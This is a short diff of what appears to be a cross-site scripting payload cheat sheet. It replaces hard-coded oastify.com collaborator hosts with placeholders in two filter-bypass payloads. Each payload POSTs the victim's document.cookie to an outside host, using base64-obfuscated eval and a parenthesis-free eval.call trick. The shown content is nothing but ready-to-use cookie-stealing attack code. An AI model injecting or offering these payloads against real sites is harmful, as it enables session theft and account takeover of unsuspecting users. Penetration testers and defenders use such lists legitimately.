@@ -14,10 +14,10 @@
 
 ```js
 // No periods (.)
-"-fetch(atob('aHR0cHM6Ly91cW8yODdieDV0OWppbWxidDJ3eXFqd3pjcWloNjd1dy5vYXN0aWZ5LmNvbQ=='), {method: 'POST', mode: 'no-cors', body:eval(atob('ZG9jdW1lbnQuY29va2ll'))})-"
+"-fetch(atob('<base64-of-your-colaborator>'), {method: 'POST', mode: 'no-cors', body:eval(atob('ZG9jdW1lbnQuY29va2ll'))})-"
 
 // No parentheses
-"-eval.call`${"fetch\x28'https://waagi9etcsuh1f1p7hm33j41osujia6z.oastify.com', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`-"
+"-eval.call`${"fetch\x28'<your-collaborator>', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`-"
 ```
 
 # Code Injection
